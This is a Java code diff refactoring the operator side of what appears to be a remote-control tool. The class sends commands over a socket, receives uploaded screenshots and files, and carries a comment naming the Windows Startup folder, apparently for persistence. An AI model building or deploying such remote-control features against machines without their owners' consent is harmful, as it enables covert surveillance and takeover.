@@ -30,12 +30,13 @@ import java.util.Scanner;
 //C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 
 public class OperatorComputer extends Computer implements Runnable{
-    static Socket socket;
-    static InputStream inputStream;
-    static OutputStream outputStream;
-    static PrintWriter pw;
-    static BufferedReader bufferedReader;
-    public static void main(String[] args) {
+    private Socket socket;
+    private InputStream inputStream;
+    private OutputStream outputStream;
+    private PrintWriter pw;
+    private BufferedReader bufferedReader;
+
+    public OperatorComputer(){
         String key = null;
         try {
             socket = new Socket();
@@ -47,7 +48,7 @@ public class OperatorComputer extends Computer implements Runnable{
             bufferedReader = IOUtil.wrapBufferedReader(inputStream,PropertiesConst.appEncoding);
             pw = IOUtil.wrapPrintWriter(outputStream,PropertiesConst.appEncoding);
 
-            ThreadManager.getExecutorService().execute(new OperatorComputer());
+            ThreadManager.getExecutorService().execute(this);
             Thread.sleep(100);
 
             submitCommand(Handler.LIST+":");
@@ -63,8 +64,12 @@ public class OperatorComputer extends Computer implements Runnable{
         }
     }
 
-    public static void submitCommand(String completeCommand){
-        OperatorExecutor operatorExecutor = new OperatorExecutor(completeCommand,pw,bufferedReader);
+    public static void main(String[] args) {
+        OperatorComputer operatorComputer = new OperatorComputer();
+    }
+
+    public void submitCommand(String completeCommand){
+        OperatorExecutor operatorExecutor = new OperatorExecutor(this,completeCommand);
         if((Handler.CMDBEGIN+Handler.separator).equals(completeCommand)){
             operatorExecutor.execute();
         }else {
@@ -82,7 +87,7 @@ public class OperatorComputer extends Computer implements Runnable{
                 System.out.println(result);
                 if(result!=null && result.contains(Handler.screenPrintUp)){
                     //如果是screenPrintUp方法，还需要上传图片到本机
-                    ScreenPrintUpHandler printUpHandler = new ScreenPrintUpHandler(result).setPw(pw);
+                    ScreenPrintUpHandler printUpHandler = new ScreenPrintUpHandler(this,result);
                     ThreadManager.getExecutorService().execute(printUpHandler);
                 }else if(result!=null && result.contains(Handler.receiveSuccess)){
                     //如果成功接收到文件
@@ -97,5 +102,48 @@ public class OperatorComputer extends Computer implements Runnable{
                 break;
             }
         }
+    }
+
+
+
+
+    public Socket getSocket() {
+        return socket;
+    }
+
+    public void setSocket(Socket socket) {
+        this.socket = socket;
+    }
+
+    public InputStream getInputStream() {
+        return inputStream;
+    }
+
+    public void setInputStream(InputStream inputStream) {
+        this.inputStream = inputStream;
+    }
+
+    public OutputStream getOutputStream() {
+        return outputStream;
+    }
+
+    public void setOutputStream(OutputStream outputStream) {
+        this.outputStream = outputStream;
+    }
+
+    public PrintWriter getPw() {
+        return pw;
+    }
+
+    public void setPw(PrintWriter pw) {
+        this.pw = pw;
+    }
+
+    public BufferedReader getBufferedReader() {
+        return bufferedReader;
+    }
+
+    public void setBufferedReader(BufferedReader bufferedReader) {
+        this.bufferedReader = bufferedReader;
     }
 }
